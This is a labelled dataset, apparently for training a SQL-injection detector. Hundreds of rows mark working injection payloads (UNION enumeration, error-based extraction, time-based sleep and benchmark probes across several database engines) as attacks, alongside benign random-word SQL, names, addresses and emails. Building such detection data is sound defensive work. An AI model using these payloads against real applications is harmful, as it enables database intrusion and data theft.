Payload	Attacker
1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'ajka'  =  'ajka	1
SELECT chart FROM empty	0
-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--	1
"1"" where 5062  =  5062"	1
1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '	1
SELECT zulu ( s )  FROM no FULL OUTER JOIN	0
 SELECT column_name ( s )  FROM realize,needed	0
-6122'   )    )     )   or 9243  =  6161--	1
1' in boolean mode  )   rlike   (  select   (  case when   (  1343  =  1595  )   then 1 else 0x28 end   )    )   #	1
1'+  (  select luwn where 1214  =  1214 union all select null,null,null,null,null,null#	1
melosa	0
SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c88946771c' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1	0
1  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  4703  =  4703	1
"1""   )    )    as wfne where 8933  =  8933"	1
1   )    )     )   rlike sleep  (  5  )   and    (    (     (  6790  =  6790	1
16c64si30	0
select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3	1
-2241  )   where 7606  =  7606 or   (  8459  =  8459  )  *4906--	1
SELECT * FROM  ( SELECT numeral FROM easy ) 	0
-8200' where 3422  =  3422 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --	1
-8328 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # rlva	1
SELECT * FROM whether WHERE ruler = 'trouble' FETCH FIRST 3 ROWS ONLY	0
"1""   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --"	1
arceo feliu	0
4urr3at9	0
"1""  )   where 7514  =  7514"	1
  UPDATE piece SET gently =  'success', City =  'duck' WHERE personal =  vegetable	0
SELECT AVG ( easily ) FROM sat	0
SELECT AVG ( pilot ) FROM larger	0
 select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'	1
   SELECT hot, sometime, bareFROM earn WHERE touch  IS NOT NULL	0
SELECT TOP 3 * FROM face WHERE coming = 'suggest'	0
"  SELECT SUBTIME ( ""10:24:21"", ""300"" ) ;"	0
darcange1	0
6142060000000000	0
"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""epfg"" like ""epfg"	1
"1"" and make_set  (  8403  =  8403,8899  )  "	1
1'   )    )     )   union all select null,null,null,null,null,null,null#	1
claudio iturrieta	0
1 union all select null,null,null#	1
SELECT COUNT ( somewhereID ) FROM increase	0
select sleep  (  5  )   and    (    (     (  'qjsc'  =  'qjsc	1
222584000000000	0
hanley	0
1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'qtfl'  =  'qtfl	1
lazure	0
"-6548%""  )   union all select 6067,6067,6067,6067,6067,6067,6067,6067,6067--"	1
fortet esquer	0
SELECT AVG ( notice ) FROM sets	0
-2625'   )    )    or 3038  =  3038	1
"1""   )    )    order by 1#"	1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i	1
 select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1	1
  SELECT Orders.fallenrID, Employees.ranch, Employees.worry FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.heldID ORDER BY Orders.biteID	0
1  )   as attr where 8085  =  8085 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --	1
afkham	0
SELECT eleven ( s ) FROM these INNER JOIN	0
2isp3n?3io43	0
INSERT INTO standard  ( pond, real, tune )  VALUES  ( 'choice', 'sudden', 'tax' )  	0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  ""oiuw""  =  ""oiuw"	1
57727237c	0
SELECT AVG ( similar ) FROM most	0
1%'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   '%'  =  '	1
1  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  	1
iif  (  4638  =  8258,1,1/0  )  	1
SELECT * FROM advice	0
1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #	1
1%'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  '%'  =  '	1
giralda	0
  SELECT waste AS her, like AS [popular]  FROM shore	0
"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--"	1
77447105x	0
   SELECT COUNT ( worry ) , stream FROM shop BY sheet	0
franza	0
 SELECT * FROM wherever ORDER BY consonant ASC, within DESC	0
"select pg_sleep  (  5  )   and   (  ""tpry""  =  ""tpry"	1
1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'lyem' like 'lyem	1
SELECT AVG ( raise )  FROM declared  SELECT SUM ( tongue ) 	0
SELECT DISTINCT ten FROM gain	0
SELECT TOP 3 * FROM throat WHERE jar = 'son'	0
wilbur	0
   SELECT sound, pleasure, you FROM surface WHERE strength  IS NULL	0
SELECT * FROM donkey 3 SELECT * FROM shut	0
1'  )   as kgnd where 1550  =  1550 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --	1
-7239' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'cswv'  =  'cswv	1
1'+  (  select 'jtvq' where 8288  =  8288 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #	1
1' and sleep  (  5  )  #	1
SELECT principal ( s )  FROM pocket FULL OUTER JOIN	0
1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'lbwh'  =  'lbwh	1
-2214'  )   union all select 8228#	1
4030000000000000	0
SELECT AVG ( object )  FROM shot  SELECT SUM ( minerals ) 	0
1%'   )    )    order by 1#	1
SELECT * FROM modern 3	0
  SELECT Orders.showrID, Employees.flew, Employees.something FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.officeID ORDER BY Orders.thoseID	0
"1""  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"	1
SELECT AVG ( for ) FROM putting SELECT SUM ( season ) 	0
-8636'   )    )     )   or 4301  =  7212--	1
3243630000000000	0
SELECT TOP 3 * FROM stage	0
select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3# kuqm	1
3074020000000000	0
-9668'   )    )    as orfu where 5822  =  5822 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --	1
  SELECT dropID AS ID, four AS importance FROM low	0
SELECT MIN ( empty )  AS rubbed FROM identity	0
SELECT gave ( s )  FROM sum SELECT meant ( s ) 	0
   SELECT money,each,cabin,opportunity,difficulty     (  (  mean JOIN in ON did.huge =  promised.higher )   INNER JOIN phraseON Orders.trap =  indicate.requireID ) 	0
"1""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""msjh"" like ""msjh"	1
SELECT COUNT ( bone )  FROM power	0
1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'brlc'  =  'brlc	1
SELECT * FROM necessary WHERE due BETWEEN thee09/01/1996window AND led15/31/1996stone	0
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_timeout_wp_stateless_google_sdk_conflict' LIMIT 1	0
  SELECT pony AS vessels, dig AS [matter]  FROM anyway	0
androlo	0
1%'   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
01449063v	0
"1""   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""gimc"" like ""gimc"	1
comprensin	0
43785	0
1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  	1
SELECT * FROM buffalo	0
1  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
1'+  (  select 'igoi' where 7823  =  7823 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'	1
SELECT COUNT ( engineer ) FROM tie	0
1'  )   and 8404  =  8651#	1
SELECT * FROM mix	0
kwangchi	0
SELECT shot ( s )  FROM height SELECT noun FROM zero	0
55585768n	0
1' in boolean mode  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  #	1
waitfor delay '0:0:5' and    (    (   'yjsp' like 'yjsp	1
c/ gaspar reyes, 172 8?f	0
glorieta puerta de hierro, 57	0
-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--	1
SELECT * FROM evidence ORDER BY train DESC	0
SELECT Count ( * )  AS office	0
 (  select 2527 from pg_sleep  (  5   )    ) 	1
1'+  (  select wpkh where 5842  =  5842	1
84996241v	0
   SELECT busy, heard+ ', ' + interior+ ' ' + history+ ', ' + usually AS own  FROM team	0
SELECT * FROM short 3 SELECT * FROM courage	0
 UPDATE in SET sound = 'line'WHERE hardly = 'whale'	0
6905240000000000	0
crovetto roger	0
1   )    )    as rvex where 3462  =  3462 and 4595  =  4595#	1
calle monte miramar, s/n	0
nooshin	0
murad@magadan.org.pe	0
1'+  (  select zpdf where 2938  =  2938	1
-4285'   )    )     )   union all select 8819,8819,8819,8819,8819,8819,8819,8819#	1
select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'oskf' like 'oskf	1
SELECT * FROM excitement 3 SELECT * FROM level	0
SELECT * FROM widely WHERE offer = 'interior' FETCH FIRST 3 ROWS ONLY	0
ciudad real	0
"-8609%""   )    )     )   union all select 6021,6021,6021,6021,6021,6021--"	1
calle de can castellvi 35, 10-h	0
-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--	1
-2110' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #	1
-7528' or make_set  (  3809  =  1821,1821  )   and 'kgch'  =  'kgch	1
SELECT * FROM certain FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM system	0
"  SELECT   CAST ( ""2017-08-29"" AS DATE ) ;"	0
   SELECT Employees.means, COUNT ( Orders.actuallyID )  AS hurryFROM    ( OrdersINNER JOIN effort ON Orders.appliedID  =  Employees.tankID ) 	0
SELECT job ( s )  FROM solar UNION ALL	0
19310	0
c/ moriles 91	0
1'  )   as fxid where 5926  =  5926	1
 SELECT * FROM managed ORDER BY official, air	0
19392	0
33273113w	0
"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   "	1
SELECT * FROM research ORDER BY rush	0
select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'ctbs' like 'ctbs	1
rob	0
SELECT * FROM  ( SELECT bridge FROM system ) 	0
"-6305""   )    )     )   or 8097  =  2048 and    (    (     (  ""euyy"" like ""euyy"	1
5585620000000000	0
SELECT * FROM history FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM seldom	0
1' or sleep  (  5  )   and 'rpqn' like 'rpqn	1
6477	0
"-6680%""   )    )    union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--"	1
1'  )   as rqzz where 4987  =  4987 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --	1
SELECT AVG ( complete ) FROM iron	0
"1"" where 8978  =  8978 union all select null,null,null,null,null,null,null,null--"	1
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1	1
lesire@masqueclases.gn	0
2110000000000000	0
1'+  (  select 'sfko' where 6853  =  6853 rlike sleep  (  5  )  #	1
1%'   )    )    order by 1--	1
SELECT * FROM if 3 SELECT * FROM tropical	0
   SELECT COUNT ( dull ) , careful FROM fort BY generally	0
"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--"	1
fickes	0
SELECT taught ( s )  FROM did SELECT clock ( s ) 	0
1  )   where 1193  =  1193 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --	1
SELECT * FROM pull 3 SELECT * FROM topic	0
8217	0
" select * from users where id  =  1 or ""%."" or 1  =  1 -- 1"	1
sonoe	0
   SELECT question, barn, lieFROM current WHERE burst  IS NOT NULL	0
1   )    )    as sfan where 7176  =  7176 and 7017  =  7358	1
SELECT COUNT ( bee ) FROM palace	0
34578974s	0
select   (  case when   (  8857  =  1512  )   then 8857 else 8857*  (  select 8857 from mysql.db  )   end  )  #	1
select * from generate_series  (  1488,1488,case when   (  1488  =  1685  )   then 1 else 0 end  )   limit 1--	1
   SELECT Employees.affect, COUNT ( Orders.coldID )  AS jarFROM    ( OrdersINNER JOIN amount ON Orders.symbolID  =  Employees.silkID ) 	0
sin sol 15,	0
SELECT * FROM though WHERE camera NOT LIKE '[spirit]%'	0
"-4165"" where 1772  =  1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772--"	1
zanobia	0
SELECT Count ( * )  AS seen	0
alcoy/alcoi	0
SELECT * FROM me FETCH FIRST 3 ROWS ONLY	0
1,extractvalue  (  9788,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  9788  =  9788,1   )    )     )  ,0x717a767a71   )    )   	1
"-6463""   )    )     )   union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#"	1
SELECT AVG ( hurt ) FROM diagram SELECT SUM ( blood ) 	0
1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'vkde'  =  'vkde	1
6588350000000000	0
-3137'||  (  select 'btif' where 1718  =  1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#	1
SELECT * FROM market WHERE road = 'long' LIMIT 3	0
SELECT * FROM drew WHERE food = 'nearly'  AND  ( principle = 'year' OR good = 'subject' ) 	0
abia de la obispala	0
1 union all select null#	1
SELECT * FROM law ORDER BY line DESC	0
-1269' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'gohv' like 'gohv	1
SELECT AVG ( against ) FROM note SELECT SUM ( deal ) 	0
PRINT @@variable	1
   SELECT Employees.answer, COUNT ( Orders.soilID )  AS chooseFROM    ( OrdersINNER JOIN neighborhood ON Orders.occurID  =  Employees.pondID ) 	0
SELECT * FROM third WHERE    NOT habit = 'design'	0
SELECT * FROM flat FETCH FIRST 3 ROWS ONLY	0
1   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   3003  =  3003	1
wenner@rpdkorea.nr	0
DELETE FROM scientific	0
calle gibraltar, 88	0
s4g51r	0
" select sleep  (  5  )   and   (  ""%""  =  """	1
"-3626%""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""%""  =  """	1
"select count  (  *  )   from generate_series  (  1,5000000  )   and ""xcjt""  =  ""xcjt"	1
SELECT * FROM take 3	0
-9505'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'qhdg'  =  'qhdg	1
